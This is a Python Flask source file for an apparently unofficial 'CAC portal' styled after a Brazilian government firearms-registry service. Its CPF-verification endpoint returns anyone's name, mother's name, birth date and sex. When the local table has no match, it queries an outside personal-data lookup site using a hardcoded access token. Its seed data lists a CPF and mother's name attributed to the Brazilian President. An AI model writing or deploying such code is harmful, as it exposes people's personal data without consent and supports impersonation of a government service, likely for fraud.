import os
import logging
import requests
from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase

# Configure logging
logging.basicConfig(level=logging.DEBUG)

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)
# Create the app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev_secret_key")
# Handling Heroku's Postgres connection string format
database_url = os.environ.get("DATABASE_URL", "sqlite:///cac.db")
# Heroku prefixes postgresql URLs with "postgres://" but SQLAlchemy needs "postgresql://"
if database_url.startswith("postgres://"):
    database_url = database_url.replace("postgres://", "postgresql://", 1)
app.config["SQLALCHEMY_DATABASE_URI"] = database_url
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
# Initialize the app with the extension
db.init_app(app)

# Import models only after db is initialized
from models import CAC  # noqa: E402

@app.route('/')
def index():
    """Render the main page of the CAC portal"""
    return render_template('index.html')

@app.route('/api/verify-cpf', methods=['POST'])
def verify_cpf():
    """API endpoint to verify a CPF"""
    cpf = request.json.get('cpf', '')
    
    # Remove non-numeric characters for database lookup
    cpf_numeric = ''.join(filter(str.isdigit, cpf))
    
    # Look up the CPF in the database
    cac_record = CAC.query.filter_by(cpf=cpf_numeric).first()
    
    if cac_record:
        # Format the date of birth
        date_parts = cac_record.data_nascimento.split('-')
        formatted_date = f"{date_parts[2]}/{date_parts[1]}/{date_parts[0]}" if len(date_parts) == 3 else cac_record.data_nascimento
        
        return jsonify({
            'status': 'approved',
            'data': {
                'cpf': f"{cpf_numeric[:3]}.{cpf_numeric[3:6]}.{cpf_numeric[6:9]}-{cpf_numeric[9:]}",
                'nome': cac_record.nome,
                'nomeMae': cac_record.nome_mae,
                'dataNascimento': formatted_date,
                'sexo': cac_record.sexo
            }
        })
    else:
        # Tente a API externa como fallback
        try:
            logging.debug(f"CPF não encontrado localmente, tentando API externa: {cpf_numeric}")
            # API externa para consulta de CPF
            api_url = f"https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf={cpf_numeric}"
            
            # Timeout para evitar esperas longas
            response = requests.get(api_url, timeout=5)
            external_data = response.json()
            
            logging.debug(f"Resposta da API externa: {external_data}")
            
            if external_data.get('DADOS'):
                data = external_data['DADOS']
                # Determinar o sexo com base no campo 'sexo' da API externa
                sexo = "Feminino" if data.get('sexo') == 'F' else "Masculino"
                
                # Formatar a data de nascimento
                try:
                    birth_date = data.get('data_nascimento', '')
                    # Remover a parte de tempo se existir
                    if ' 00:00:00' in birth_date:
                        birth_date = birth_date.replace(' 00:00:00', '')
                    
                    # Verificar se a data está em formato ISO (YYYY-MM-DD)
                    if birth_date and '-' in birth_date:
                        date_parts = birth_date.split('-')
                        if len(date_parts) == 3:
                            formatted_date = f"{date_parts[2]}/{date_parts[1]}/{date_parts[0]}"
                        else:
                            formatted_date = birth_date
                    else:
                        formatted_date = birth_date
                except Exception as e:
                    logging.error(f"Erro ao formatar data de nascimento: {e}")
                    formatted_date = data.get('data_nascimento', '')
                
                return jsonify({
                    'status': 'approved',
                    'data': {
                        'cpf': data.get('cpf', cpf_numeric),
                        'nome': data.get('nome', ''),
                        'nomeMae': data.get('nome_mae', ''),
                        'dataNascimento': formatted_date,
                        'sexo': sexo
                    }
                })
            
        except Exception as e:
            logging.error(f"Erro ao consultar API externa: {e}")
            # Continua com o fluxo normal se houver erro
        
        return jsonify({
            'status': 'not_found',
            'message': 'CPF não encontrado no sistema. Verifique se digitou corretamente ou entre em contato com o SFPC mais próximo.'
        })

# Initialize the database
with app.app_context():
    db.create_all()
    
    # Add sample CAC entries if the database is empty
    if not CAC.query.first():
        sample_data = [
            CAC(cpf='12345678900', nome='João da Silva', nome_mae='Maria da Silva', 
                data_nascimento='1980-05-15', sexo='Masculino'),
            CAC(cpf='98765432100', nome='Ana Oliveira', nome_mae='Teresa Oliveira', 
                data_nascimento='1992-11-27', sexo='Feminino'),
            # Add CPF from Brazilian government for testing (President)
            CAC(cpf='07047846895', nome='Luiz Inácio Lula da Silva', nome_mae='Eurídice Ferreira de Mello', 
                data_nascimento='1945-10-27', sexo='Masculino')
        ]
        db.session.add_all(sample_data)
        db.session.commit()
        logging.debug("Added sample CAC data to the database")

# Configuração para produção
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    # Em produção, o debug deve ser False
    debug = os.environ.get("DEBUG", "False").lower() == "true"
    app.run(host='0.0.0.0', port=port, debug=debug)
